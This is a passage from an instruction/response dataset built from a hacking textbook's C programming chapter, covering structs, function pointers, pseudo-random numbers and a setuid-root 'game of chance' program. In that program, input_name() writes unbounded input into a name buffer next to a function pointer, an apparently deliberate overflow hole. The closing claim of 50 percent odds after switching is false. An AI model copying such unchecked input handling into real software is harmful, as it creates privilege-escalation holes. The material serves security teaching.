    "output": "[DEBUG] found a 34 byte note for user id 999\nthis is a test of multiuser notes\n-------[ end of note data ]-------\nreader@hacking:~/booksrc $\nWhen compiled and setuid root, the notesearch program works as\nexpected. But this is just a single user; what happens if a different user uses\nthe notetaker and notesearch programs?\nreader@hacking:~/booksrc $ sudo su jose\njose@hacking:/home/reader/booksrc $ ./notetaker \"This is a note for jose\"\n[DEBUG] buffer @ 0x804a008: 'This is a note for jose'\n[DEBUG] datafile @ 0x804a070: '/var/notes'\n[DEBUG] file descriptor is 3\nNote has been saved.\njose@hacking:/home/reader/booksrc $ ./notesearch\n[DEBUG] found a 24 byte note for user id 501\nThis is a note for jose\n-------[ end of note data ]-------\njose@hacking:/home/reader/booksrc $\nWhen the user jose uses these programs, the real user ID is 501. This\nmeans that value is added to all notes written with notetaker, and only notes\nwith a matching user ID will be displayed by the notesearch program.\nreader@hacking:~/booksrc $ ./notetaker \"This is another note for the reader user\"\n[DEBUG] buffer @ 0x804a008: 'This is another note for the reader user'\n[DEBUG] datafile @ 0x804a070: '/var/notes'\n[DEBUG] file descriptor is 3\nNote has been saved.\nreader@hacking:~/booksrc $ ./notesearch\n[DEBUG] found a 34 byte note for user id 999\nthis is a test of multiuser notes\n[DEBUG] found a 41 byte note for user id 999\nThis is another note for the reader user\n-------[ end of note data ]-------\nreader@hacking:~/booksrc $\nSimilarly, all notes for the user reader have the user ID 999 attached to\nthem. Even though both the notetaker and notesearch programs are suid\nroot and have full read and write access to the /var/notes datafile, the pro-\ngram logic in the notesearch program prevents the current user from view-\ning other users’ notes. This is very similar to how the /etc/passwd file stores\nuser information for all users, yet programs like chsh and passwd allow any user\nto change his own shell or password.\n0x284 Structs\nSometimes there are multiple variables that should be grouped together and\ntreated like one. In C, structs are variables that can contain many other vari-\nables. Structs are often used by various system functions and libraries, so\nunderstanding how to use structs is a prerequisite to using these functions.\n96 0x200\nA simple example will suffice for now. When dealing with many time functions,\nthese functions use a time struct called tm, which is defined in /usr/include/\ntime.h. The struct’s definition is as follows.\nstruct tm {\nint tm_sec; /* seconds */\nint tm_min; /* minutes */\nint tm_hour; /* hours */\nint tm_mday; /* day of the month */\nint tm_mon; /* month */\nint tm_year; /* year */\nint tm_wday; /* day of the week */\nint tm_yday; /* day in the year */\nint tm_isdst; /* daylight saving time */\n};\nAfter this struct is defined, struct tm becomes a usable variable type, which\ncan be used to declare variables and pointers with the data type of the tm struct.\nThe time_example.c program demonstrates this. When time.h is included,\nthe tm struct is defined, which is later used to declare the current_time and\ntime_ptr variables.\ntime_example.c\n#include <stdio.h>\n#include <time.h>\nint main() {\nlong int seconds_since_epoch;\nstruct tm current_time, *time_ptr;\nint hour, minute, second, day, month, year;\nseconds_since_epoch = time(0); // Pass time a null pointer as argument.\nprintf(\"time() - seconds since epoch: %ld\\n\", seconds_since_epoch);\ntime_ptr = &current_time; // Set time_ptr to the address of\n// the current_time struct.\nlocaltime_r(&seconds_since_epoch, time_ptr);\n// Three different ways to access struct elements:\nhour = current_time.tm_hour; // Direct access\nminute = time_ptr->tm_min; // Access via pointer\nsecond = *((int *) time_ptr); // Hacky pointer access\nprintf(\"Current time is: %02d:%02d:%02d\\n\", hour, minute, second);\n}\nThe time() function will return the number of seconds since January 1,\n1970. Time on Unix systems is kept relative to this rather arbitrary point in\ntime, which is also known as the epoch. The localtime_r() function expects two\npointers as arguments: one to the number of seconds since epoch and the\nother to a tm struct. The pointer time_ptr has already been set to the address\nProgramming 97\nof current_time, an empty tm struct. The address-of operator is used to provide\na pointer to seconds_since_epoch for the other argument to localtime_r(), which\nfills the elements of the tm struct. The elements of structs can be accessed in\nthree different ways; the first two are the proper ways to access struct elements,\nand the third is a hacked solution. If a struct variable is used, its elements can\nbe accessed by adding the elements’ names to the end of the variable name\nwith a period. Therefore, current_time.tm_hour will access just the tm_hour\nelement of the tm struct called current_time. Pointers to structs are often used,\nsince it is much more efficient to pass a four-byte pointer than an entire data\nstructure. Struct pointers are so common that C has a built-in method to\naccess struct elements from a struct pointer without needing to dereference\nthe pointer. When using a struct pointer like time_ptr, struct elements can be\nsimilarly accessed by the struct element’s name, but using a series of charac-\nters that looks like an arrow pointing right. Therefore, time_ptr->tm_min will\naccess the tm_min element of the tm struct that is pointed to by time_ptr. The\nseconds could be accessed via either of these proper methods, using the\ntm_sec element or the tm struct, but a third method is used. Can you figure\nout how this third method works?\nreader@hacking:~/booksrc $ gcc time_example.c\nreader@hacking:~/booksrc $ ./a.out\ntime() - seconds since epoch: 1189311588\nCurrent time is: 04:19:48\nreader@hacking:~/booksrc $ ./a.out\ntime() - seconds since epoch: 1189311600\nCurrent time is: 04:20:00\nreader@hacking:~/booksrc $\nThe program works as expected, but how are the seconds being accessed\nin the tm struct? Remember that in the end, it’s all just memory. Since tm_sec is\ndefined at the beginning of the tm struct, that integer value is also found at\nthe beginning. In the line second = *((int *) time_ptr), the variable time_ptr\nistypecast from a tm struct pointer to an integer pointer. Then this typecast\npointer is dereferenced, returning the data at the pointer’s address. Since\nthe address to the tm struct also points to the first element of this struct, this\nwill retrieve the integer value for tm_sec in the struct. The following addition\nto the time_example.c code (time_example2.c) also dumps the bytes of the\ncurrent_time. This shows that the elements of tm struct are right next to each\nother in memory. The elements further down in the struct can also be directly\naccessed with pointers by simply adding to the address of the pointer.\ntime_example2.c\n#include <stdio.h>\n#include <time.h>\nvoid dump_time_struct_bytes(struct tm *time_ptr, int size) {\nint i;\nunsigned char *raw_ptr;\n98 0x200\nprintf(\"bytes of struct located at 0x%08x\\n\", time_ptr);\nraw_ptr = (unsigned char *) time_ptr;\nfor(i=0; i < size; i++)\n{\nprintf(\"%02x \", raw_ptr[i]);\nif(i%16 == 15) // Print a newline every 16 bytes.\nprintf(\"\\n\");\n}\nprintf(\"\\n\");\n}\nint main() {\nlong int seconds_since_epoch;\nstruct tm current_time, *time_ptr;\nint hour, minute, second, i, *int_ptr;\nseconds_since_epoch = time(0); // Pass time a null pointer as argument.\nprintf(\"time() - seconds since epoch: %ld\\n\", seconds_since_epoch);\ntime_ptr = &current_time; // Set time_ptr to the address of\n// the current_time struct.\nlocaltime_r(&seconds_since_epoch, time_ptr);\n// Three different ways to access struct elements:\nhour = current_time.tm_hour; // Direct access\nminute = time_ptr->tm_min; // Access via pointer\nsecond = *((int *) time_ptr); // Hacky pointer access\nprintf(\"Current time is: %02d:%02d:%02d\\n\", hour, minute, second);\ndump_time_struct_bytes(time_ptr, sizeof(struct tm));\nminute = hour = 0; // Clear out minute and hour.\nint_ptr = (int *) time_ptr;\nfor(i=0; i < 3; i++) {\nprintf(\"int_ptr @ 0x%08x : %d\\n\", int_ptr, *int_ptr);\nint_ptr++; // Adding 1 to int_ptr adds 4 to the address,\n} // since an int is 4 bytes in size.\n}\nThe results of compiling and executing time_example2.c are as follows.\nreader@hacking:~/booksrc $ gcc -g time_example2.c\nreader@hacking:~/booksrc $ ./a.out\ntime() - seconds since epoch: 1189311744\nCurrent time is: 04:22:24\nbytes of struct located at 0xbffff7f0\n18 00 00 00 16 00 00 00 04 00 00 00 09 00 00 00\n08 00 00 00 6b 00 00 00 00 00 00 00 fb 00 00 00\n00 00 00 00 00 00 00 00 28 a0 04 08\nint_ptr @ 0xbffff7f0 : 24\nint_ptr @ 0xbffff7f4 : 22\nint_ptr @ 0xbffff7f8 : 4\nreader@hacking:~/booksrc $\nProgramming 99"
  },
  {
    "input": "0x285 Function Pointers",
    "output": "While struct memory can be accessed this way, assumptions are made\nabout the type of variables in the struct and the lack of any padding between\nvariables. Since the data types of a struct’s elements are also stored in the\nstruct, using proper methods to access struct elements is much easier.\n0x285 Function Pointers\nA pointer simply contains a memory address and is given a data type that\ndescribes where it points. Usually, pointers are used for variables; however,\nthey can also be used for functions. The funcptr_example.c program\ndemonstrates the use of function pointers.\nfuncptr_example.c\n#include <stdio.h>\nint func_one() {\nprintf(\"This is function one\\n\");\nreturn 1;\n}\nint func_two() {\nprintf(\"This is function two\\n\");\nreturn 2;\n}\nint main() {\nint value;\nint (*function_ptr) ();\nfunction_ptr = func_one;\nprintf(\"function_ptr is 0x%08x\\n\", function_ptr);\nvalue = function_ptr();\nprintf(\"value returned was %d\\n\", value);\nfunction_ptr = func_two;\nprintf(\"function_ptr is 0x%08x\\n\", function_ptr);\nvalue = function_ptr();\nprintf(\"value returned was %d\\n\", value);\n}\nIn this program, a function pointer aptly named function_ptr is declared\nin main(). This pointer is then set to point at the function func_one() and is\ncalled; then it is set again and used to call func_two(). The output below shows\nthe compilation and execution of this source code.\nreader@hacking:~/booksrc $ gcc funcptr_example.c\nreader@hacking:~/booksrc $ ./a.out\nfunction_ptr is 0x08048374\nThis is function one\nvalue returned was 1\n100 0x200"
  },
  {
    "input": "0x286 Pseudo-random Numbers",
    "output": "function_ptr is 0x0804838d\nThis is function two\nvalue returned was 2\nreader@hacking:~/booksrc $\n0x286 Pseudo-random Numbers\nSince computers are deterministic machines, it is impossible for them to\nproduce truly random numbers. But many applications require some form of\nrandomness. The pseudo-random number generator functions fill this need\nby generating a stream of numbers that is pseudo-random. These functions\ncan produce a seemingly random sequence of numbers started from a seed\nnumber; however, the same exact sequence can be generated again with the\nsame seed. Deterministic machines cannot produce true randomness, but if\nthe seed value of the pseudo-random generation function isn’t known, the\nsequence will seem random. The generator must be seeded with a value\nusing the function srand(), and from that point on, the function rand() will\nreturn a pseudo-random number from 0 to RAND_MAX. These functions and\nRAND_MAX are defined in stdlib.h. While the numbers rand() returns will appear\nto be random, they are dependent on the seed value provided to srand().\nTo maintain pseudo-randomness between subsequent program executions,\nthe randomizer must be seeded with a different value each time. One common\npractice is to use the number of seconds since epoch (returned from the time()\nfunction) as the seed. The rand_example.c program demonstrates this\ntechnique.\nrand_example.c\n#include <stdio.h>\n#include <stdlib.h>\nint main() {\nint i;\nprintf(\"RAND_MAX is %u\\n\", RAND_MAX);\nsrand(time(0));\nprintf(\"random values from 0 to RAND_MAX\\n\");\nfor(i=0; i < 8; i++)\nprintf(\"%d\\n\", rand());\nprintf(\"random values from 1 to 20\\n\");\nfor(i=0; i < 8; i++)\nprintf(\"%d\\n\", (rand()%20)+1);\n}\nNotice how the modulus operator is used to obtain random values from\n1 to 20.\nreader@hacking:~/booksrc $ gcc rand_example.c\nreader@hacking:~/booksrc $ ./a.out\nRAND_MAX is 2147483647\nrandom values from 0 to RAND_MAX\nProgramming 101"
  },
  {
    "input": "0x287 A Game of Chance",
    "output": "815015288\n1315541117\n2080969327\n450538726\n710528035\n907694519\n1525415338\n1843056422\nrandom values from 1 to 20\n2\n3\n8\n5\n9\n1\n4\n20\nreader@hacking:~/booksrc $ ./a.out\nRAND_MAX is 2147483647\nrandom values from 0 to RAND_MAX\n678789658\n577505284\n1472754734\n2134715072\n1227404380\n1746681907\n341911720\n93522744\nrandom values from 1 to 20\n6\n16\n12\n19\n8\n19\n2\n1\nreader@hacking:~/booksrc $\nThe program’s output just displays random numbers. Pseudo-randomness\ncan also be used for more complex programs, as you will see in this section’s\nfinal script.\n0x287 A Game of Chance\nThe final program in this section is a set of games of chance that use many\nof the concepts we’ve discussed. The program uses pseudo-random number\ngenerator functions to provide the element of chance. It has three different\ngame functions, which are called using a single global function pointer, and\nit uses structs to hold data for the player, which is saved in a file. Multi-user file\npermissions and user IDs allow multiple users to play and maintain their own\naccount data. The game_of_chance.c program code is heavily documented,\nand you should be able to understand it at this point.\n102 0x200\ngame_of_chance.c\n#include <stdio.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/stat.h>\n#include <time.h>\n#include <stdlib.h>\n#include \"hacking.h\"\n#define DATAFILE \"/var/chance.data\" // File to store user data\n// Custom user struct to store information about users\nstruct user {\nint uid;\nint credits;\nint highscore;\nchar name[100];\nint (*current_game) ();\n};\n// Function prototypes\nint get_player_data();\nvoid register_new_player();\nvoid update_player_data();\nvoid show_highscore();\nvoid jackpot();\nvoid input_name();\nvoid print_cards(char *, char *, int);\nint take_wager(int, int);\nvoid play_the_game();\nint pick_a_number();\nint dealer_no_match();\nint find_the_ace();\nvoid fatal(char *);\n// Global variables\nstruct user player; // Player struct\nint main() {\nint choice, last_game;\nsrand(time(0)); // Seed the randomizer with the current time.\nif(get_player_data() == -1) // Try to read player data from file.\nregister_new_player(); // If there is no data, register a new player.\nwhile(choice != 7) {\nprintf(\"-=[ Game of Chance Menu ]=-\\n\");\nprintf(\"1 - Play the Pick a Number game\\n\");\nprintf(\"2 - Play the No Match Dealer game\\n\");\nprintf(\"3 - Play the Find the Ace game\\n\");\nprintf(\"4 - View current high score\\n\");\nprintf(\"5 - Change your user name\\n\");\nProgramming 103\nprintf(\"6 - Reset your account at 100 credits\\n\");\nprintf(\"7 - Quit\\n\");\nprintf(\"[Name: %s]\\n\", player.name);\nprintf(\"[You have %u credits] -> \", player.credits);\nscanf(\"%d\", &choice);\nif((choice < 1) || (choice > 7))\nprintf(\"\\n[!!] The number %d is an invalid selection.\\n\\n\", choice);\nelse if (choice < 4) { // Otherwise, choice was a game of some sort.\nif(choice != last_game) { // If the function ptr isn't set\nif(choice == 1) // then point it at the selected game\nplayer.current_game = pick_a_number;\nelse if(choice == 2)\nplayer.current_game = dealer_no_match;\nelse\nplayer.current_game = find_the_ace;\nlast_game = choice; // and set last_game.\n}\nplay_the_game(); // Play the game.\n}\nelse if (choice == 4)\nshow_highscore();\nelse if (choice == 5) {\nprintf(\"\\nChange user name\\n\");\nprintf(\"Enter your new name: \");\ninput_name();\nprintf(\"Your name has been changed.\\n\\n\");\n}\nelse if (choice == 6) {\nprintf(\"\\nYour account has been reset with 100 credits.\\n\\n\");\nplayer.credits = 100;\n}\n}\nupdate_player_data();\nprintf(\"\\nThanks for playing! Bye.\\n\");\n}\n// This function reads the player data for the current uid\n// from the file. It returns -1 if it is unable to find player\n// data for the current uid.\nint get_player_data() {\nint fd, uid, read_bytes;\nstruct user entry;\nuid = getuid();\nfd = open(DATAFILE, O_RDONLY);\nif(fd == -1) // Can't open the file, maybe it doesn't exist\nreturn -1;\nread_bytes = read(fd, &entry, sizeof(struct user)); // Read the first chunk.\nwhile(entry.uid != uid && read_bytes > 0) { // Loop until proper uid is found.\nread_bytes = read(fd, &entry, sizeof(struct user)); // Keep reading.\n}\nclose(fd); // Close the file.\nif(read_bytes < sizeof(struct user)) // This means that the end of file was reached.\n104 0x200\nreturn -1;\nelse\nplayer = entry; // Copy the read entry into the player struct.\nreturn 1; // Return a success.\n}\n// This is the new user registration function.\n// It will create a new player account and append it to the file.\nvoid register_new_player() {\nint fd;\nprintf(\"-=-={ New Player Registration }=-=-\\n\");\nprintf(\"Enter your name: \");\ninput_name();\nplayer.uid = getuid();\nplayer.highscore = player.credits = 100;\nfd = open(DATAFILE, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);\nif(fd == -1)\nfatal(\"in register_new_player() while opening file\");\nwrite(fd, &player, sizeof(struct user));\nclose(fd);\nprintf(\"\\nWelcome to the Game of Chance %s.\\n\", player.name);\nprintf(\"You have been given %u credits.\\n\", player.credits);\n}\n// This function writes the current player data to the file.\n// It is used primarily for updating the credits after games.\nvoid update_player_data() {\nint fd, i, read_uid;\nchar burned_byte;\nfd = open(DATAFILE, O_RDWR);\nif(fd == -1) // If open fails here, something is really wrong.\nfatal(\"in update_player_data() while opening file\");\nread(fd, &read_uid, 4); // Read the uid from the first struct.\nwhile(read_uid != player.uid) { // Loop until correct uid is found.\nfor(i=0; i < sizeof(struct user) - 4; i++) // Read through the\nread(fd, &burned_byte, 1); // rest of that struct.\nread(fd, &read_uid, 4); // Read the uid from the next struct.\n}\nwrite(fd, &(player.credits), 4); // Update credits.\nwrite(fd, &(player.highscore), 4); // Update highscore.\nwrite(fd, &(player.name), 100); // Update name.\nclose(fd);\n}\n// This function will display the current high score and\n// the name of the person who set that high score.\nvoid show_highscore() {\nunsigned int top_score = 0;\nchar top_name[100];\nstruct user entry;\nProgramming 105\nint fd;\nprintf(\"\\n====================| HIGH SCORE |====================\\n\");\nfd = open(DATAFILE, O_RDONLY);\nif(fd == -1)\nfatal(\"in show_highscore() while opening file\");\nwhile(read(fd, &entry, sizeof(struct user)) > 0) { // Loop until end of file.\nif(entry.highscore > top_score) { // If there is a higher score,\ntop_score = entry.highscore; // set top_score to that score\nstrcpy(top_name, entry.name); // and top_name to that username.\n}\n}\nclose(fd);\nif(top_score > player.highscore)\nprintf(\"%s has the high score of %u\\n\", top_name, top_score);\nelse\nprintf(\"You currently have the high score of %u credits!\\n\", player.highscore);\nprintf(\"======================================================\\n\\n\");\n}\n// This function simply awards the jackpot for the Pick a Number game.\nvoid jackpot() {\nprintf(\"*+*+*+*+*+* JACKPOT *+*+*+*+*+*\\n\");\nprintf(\"You have won the jackpot of 100 credits!\\n\");\nplayer.credits += 100;\n}\n// This function is used to input the player name, since\n// scanf(\"%s\", &whatever) will stop input at the first space.\nvoid input_name() {\nchar *name_ptr, input_char='\\n';\nwhile(input_char == '\\n') // Flush any leftover\nscanf(\"%c\", &input_char); // newline chars.\nname_ptr = (char *) &(player.name); // name_ptr = player name's address\nwhile(input_char != '\\n') { // Loop until newline.\n*name_ptr = input_char; // Put the input char into name field.\nscanf(\"%c\", &input_char); // Get the next char.\nname_ptr++; // Increment the name pointer.\n}\n*name_ptr = 0; // Terminate the string.\n}\n// This function prints the 3 cards for the Find the Ace game.\n// It expects a message to display, a pointer to the cards array,\n// and the card the user has picked as input. If the user_pick is\n// -1, then the selection numbers are displayed.\nvoid print_cards(char *message, char *cards, int user_pick) {\nint i;\nprintf(\"\\n\\t*** %s ***\\n\", message);\nprintf(\" \\t._.\\t._.\\t._.\\n\");\nprintf(\"Cards:\\t|%c|\\t|%c|\\t|%c|\\n\\t\", cards[0], cards[1], cards[2]);\nif(user_pick == -1)\nprintf(\" 1 \\t 2 \\t 3\\n\");\n106 0x200\nelse {\nfor(i=0; i < user_pick; i++)\nprintf(\"\\t\");\nprintf(\" ^-- your pick\\n\");\n}\n}\n// This function inputs wagers for both the No Match Dealer and\n// Find the Ace games. It expects the available credits and the\n// previous wager as arguments. The previous_wager is only important\n// for the second wager in the Find the Ace game. The function\n// returns -1 if the wager is too big or too little, and it returns\n// the wager amount otherwise.\nint take_wager(int available_credits, int previous_wager) {\nint wager, total_wager;\nprintf(\"How many of your %d credits would you like to wager? \", available_credits);\nscanf(\"%d\", &wager);\nif(wager < 1) { // Make sure the wager is greater than 0.\nprintf(\"Nice try, but you must wager a positive number!\\n\");\nreturn -1;\n}\ntotal_wager = previous_wager + wager;\nif(total_wager > available_credits) { // Confirm available credits\nprintf(\"Your total wager of %d is more than you have!\\n\", total_wager);\nprintf(\"You only have %d available credits, try again.\\n\", available_credits);\nreturn -1;\n}\nreturn wager;\n}\n// This function contains a loop to allow the current game to be\n// played again. It also writes the new credit totals to file\n// after each game is played.\nvoid play_the_game() {\nint play_again = 1;\nint (*game) ();\nchar selection;\nwhile(play_again) {\nprintf(\"\\n[DEBUG] current_game pointer @ 0x%08x\\n\", player.current_game);\nif(player.current_game() != -1) { // If the game plays without error and\nif(player.credits > player.highscore) // a new high score is set,\nplayer.highscore = player.credits; // update the highscore.\nprintf(\"\\nYou now have %u credits\\n\", player.credits);\nupdate_player_data(); // Write the new credit total to file.\nprintf(\"Would you like to play again? (y/n) \");\nselection = '\\n';\nwhile(selection == '\\n') // Flush any extra newlines.\nscanf(\"%c\", &selection);\nif(selection == 'n')\nplay_again = 0;\n}\nelse // This means the game returned an error,\nplay_again = 0; // so return to main menu.\nProgramming 107\n}\n}\n// This function is the Pick a Number game.\n// It returns -1 if the player doesn't have enough credits.\nint pick_a_number() {\nint pick, winning_number;\nprintf(\"\\n####### Pick a Number ######\\n\");\nprintf(\"This game costs 10 credits to play. Simply pick a number\\n\");\nprintf(\"between 1 and 20, and if you pick the winning number, you\\n\");\nprintf(\"will win the jackpot of 100 credits!\\n\\n\");\nwinning_number = (rand() % 20) + 1; // Pick a number between 1 and 20.\nif(player.credits < 10) {\nprintf(\"You only have %d credits. That's not enough to play!\\n\\n\", player.credits);\nreturn -1; // Not enough credits to play\n}\nplayer.credits -= 10; // Deduct 10 credits.\nprintf(\"10 credits have been deducted from your account.\\n\");\nprintf(\"Pick a number between 1 and 20: \");\nscanf(\"%d\", &pick);\nprintf(\"The winning number is %d\\n\", winning_number);\nif(pick == winning_number)\njackpot();\nelse\nprintf(\"Sorry, you didn't win.\\n\");\nreturn 0;\n}\n// This is the No Match Dealer game.\n// It returns -1 if the player has 0 credits.\nint dealer_no_match() {\nint i, j, numbers[16], wager = -1, match = -1;\nprintf(\"\\n::::::: No Match Dealer :::::::\\n\");\nprintf(\"In this game, you can wager up to all of your credits.\\n\");\nprintf(\"The dealer will deal out 16 random numbers between 0 and 99.\\n\");\nprintf(\"If there are no matches among them, you double your money!\\n\\n\");\nif(player.credits == 0) {\nprintf(\"You don't have any credits to wager!\\n\\n\");\nreturn -1;\n}\nwhile(wager == -1)\nwager = take_wager(player.credits, 0);\nprintf(\"\\t\\t::: Dealing out 16 random numbers :::\\n\");\nfor(i=0; i < 16; i++) {\nnumbers[i] = rand() % 100; // Pick a number between 0 and 99.\nprintf(\"%2d\\t\", numbers[i]);\nif(i%8 == 7) // Print a line break every 8 numbers.\nprintf(\"\\n\");\n}\nfor(i=0; i < 15; i++) { // Loop looking for matches.\n108 0x200\nj = i + 1;\nwhile(j < 16) {\nif(numbers[i] == numbers[j])\nmatch = numbers[i];\nj++;\n}\n}\nif(match != -1) {\nprintf(\"The dealer matched the number %d!\\n\", match);\nprintf(\"You lose %d credits.\\n\", wager);\nplayer.credits -= wager;\n} else {\nprintf(\"There were no matches! You win %d credits!\\n\", wager);\nplayer.credits += wager;\n}\nreturn 0;\n}\n// This is the Find the Ace game.\n// It returns -1 if the player has 0 credits.\nint find_the_ace() {\nint i, ace, total_wager;\nint invalid_choice, pick = -1, wager_one = -1, wager_two = -1;\nchar choice_two, cards[3] = {'X', 'X', 'X'};\nace = rand()%3; // Place the ace randomly.\nprintf(\"******* Find the Ace *******\\n\");\nprintf(\"In this game, you can wager up to all of your credits.\\n\");\nprintf(\"Three cards will be dealt out, two queens and one ace.\\n\");\nprintf(\"If you find the ace, you will win your wager.\\n\");\nprintf(\"After choosing a card, one of the queens will be revealed.\\n\");\nprintf(\"At this point, you may either select a different card or\\n\");\nprintf(\"increase your wager.\\n\\n\");\nif(player.credits == 0) {\nprintf(\"You don't have any credits to wager!\\n\\n\");\nreturn -1;\n}\nwhile(wager_one == -1) // Loop until valid wager is made.\nwager_one = take_wager(player.credits, 0);\nprint_cards(\"Dealing cards\", cards, -1);\npick = -1;\nwhile((pick < 1) || (pick > 3)) { // Loop until valid pick is made.\nprintf(\"Select a card: 1, 2, or 3 \");\nscanf(\"%d\", &pick);\n}\npick--; // Adjust the pick since card numbering starts at 0.\ni=0;\nwhile(i == ace || i == pick) // Keep looping until\ni++; // we find a valid queen to reveal.\ncards[i] = 'Q';\nprint_cards(\"Revealing a queen\", cards, pick);\nProgramming 109\ninvalid_choice = 1;\nwhile(invalid_choice) { // Loop until valid choice is made.\nprintf(\"Would you like to:\\n[c]hange your pick\\tor\\t[i]ncrease your wager?\\n\");\nprintf(\"Select c or i: \");\nchoice_two = '\\n';\nwhile(choice_two == '\\n') // Flush extra newlines.\nscanf(\"%c\", &choice_two);\nif(choice_two == 'i') { // Increase wager.\ninvalid_choice=0; // This is a valid choice.\nwhile(wager_two == -1) // Loop until valid second wager is made.\nwager_two = take_wager(player.credits, wager_one);\n}\nif(choice_two == 'c') { // Change pick.\ni = invalid_choice = 0; // Valid choice\nwhile(i == pick || cards[i] == 'Q') // Loop until the other card\ni++; // is found,\npick = i; // and then swap pick.\nprintf(\"Your card pick has been changed to card %d\\n\", pick+1);\n}\n}\nfor(i=0; i < 3; i++) { // Reveal all of the cards.\nif(ace == i)\ncards[i] = 'A';\nelse\ncards[i] = 'Q';\n}\nprint_cards(\"End result\", cards, pick);\nif(pick == ace) { // Handle win.\nprintf(\"You have won %d credits from your first wager\\n\", wager_one);\nplayer.credits += wager_one;\nif(wager_two != -1) {\nprintf(\"and an additional %d credits from your second wager!\\n\", wager_two);\nplayer.credits += wager_two;\n}\n} else { // Handle loss.\nprintf(\"You have lost %d credits from your first wager\\n\", wager_one);\nplayer.credits -= wager_one;\nif(wager_two != -1) {\nprintf(\"and an additional %d credits from your second wager!\\n\", wager_two);\nplayer.credits -= wager_two;\n}\n}\nreturn 0;\n}\nSince this is a multi-user program that writes to a file in the /var dir-\nectory, it must be suid root.\nreader@hacking:~/booksrc $ gcc -o game_of_chance game_of_chance.c\nreader@hacking:~/booksrc $ sudo chown root:root ./game_of_chance\nreader@hacking:~/booksrc $ sudo chmod u+s ./game_of_chance\nreader@hacking:~/booksrc $ ./game_of_chance\n110 0x200\n-=-={ New Player Registration }=-=-\nEnter your name: Jon Erickson\nWelcome to the Game of Chance, Jon Erickson.\nYou have been given 100 credits.\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your username\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: Jon Erickson]\n[You have 100 credits] -> 1\n[DEBUG] current_game pointer @ 0x08048e6e\n####### Pick a Number ######\nThis game costs 10 credits to play. Simply pick a number\nbetween 1 and 20, and if you pick the winning number, you\nwill win the jackpot of 100 credits!\n10 credits have been deducted from your account.\nPick a number between 1 and 20: 7\nThe winning number is 14.\nSorry, you didn't win.\nYou now have 90 credits.\nWould you like to play again? (y/n) n\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your username\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: Jon Erickson]\n[You have 90 credits] -> 2\n[DEBUG] current_game pointer @ 0x08048f61\n::::::: No Match Dealer :::::::\nIn this game you can wager up to all of your credits.\nThe dealer will deal out 16 random numbers between 0 and 99.\nIf there are no matches among them, you double your money!\nHow many of your 90 credits would you like to wager? 30\n::: Dealing out 16 random numbers :::\n88 68 82 51 21 73 80 50\n11 64 78 85 39 42 40 95\nThere were no matches! You win 30 credits!\nYou now have 120 credits\nProgramming 111\nWould you like to play again? (y/n) n\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your username\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: Jon Erickson]\n[You have 120 credits] -> 3\n[DEBUG] current_game pointer @ 0x0804914c\n******* Find the Ace *******\nIn this game you can wager up to all of your credits.\nThree cards will be dealt: two queens and one ace.\nIf you find the ace, you will win your wager.\nAfter choosing a card, one of the queens will be revealed.\nAt this point you may either select a different card or\nincrease your wager.\nHow many of your 120 credits would you like to wager? 50\n*** Dealing cards ***\n._. ._. ._.\nCards: |X| |X| |X|\n1 2 3\nSelect a card: 1, 2, or 3: 2\n*** Revealing a queen ***\n._. ._. ._.\nCards: |X| |X| |Q|\n^-- your pick\nWould you like to\n[c]hange your pick or [i]ncrease your wager?\nSelect c or i: c\nYour card pick has been changed to card 1.\n*** End result ***\n._. ._. ._.\nCards: |A| |Q| |Q|\n^-- your pick\nYou have won 50 credits from your first wager.\nYou now have 170 credits.\nWould you like to play again? (y/n) n\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your username\n6 - Reset your account at 100 credits\n7 - Quit\n112 0x200\n[Name: Jon Erickson]\n[You have 170 credits] -> 4\n====================| HIGH SCORE |====================\nYou currently have the high score of 170 credits!\n======================================================\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your username\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: Jon Erickson]\n[You have 170 credits] -> 7\nThanks for playing! Bye.\nreader@hacking:~/booksrc $ sudo su jose\njose@hacking:/home/reader/booksrc $ ./game_of_chance\n-=-={ New Player Registration }=-=-\nEnter your name: Jose Ronnick\nWelcome to the Game of Chance Jose Ronnick.\nYou have been given 100 credits.\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score 5 - Change your username\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: Jose Ronnick]\n[You have 100 credits] -> 4\n====================| HIGH SCORE |====================\nJon Erickson has the high score of 170.\n======================================================\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your username\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: Jose Ronnick]\n[You have 100 credits] -> 7\nThanks for playing! Bye.\njose@hacking:~/booksrc $ exit\nexit\nreader@hacking:~/booksrc $\nProgramming 113\nPlay around with this program a little bit. The Find the Ace game is a\ndemonstration of a principle of conditional probability; although it is counter-\nintuitive, changing your pick will increase your chances of finding the ace\nfrom 33 percent to 50 percent. Many people have difficulty understanding\nthis truth—that’s why it’s counterintuitive. The secret of hacking is under-\nstanding little-known truths like this and using them to produce seemingly\nmagical results.\n114 0x200"
  },
  {
    "input": "0x300: Exploitation",
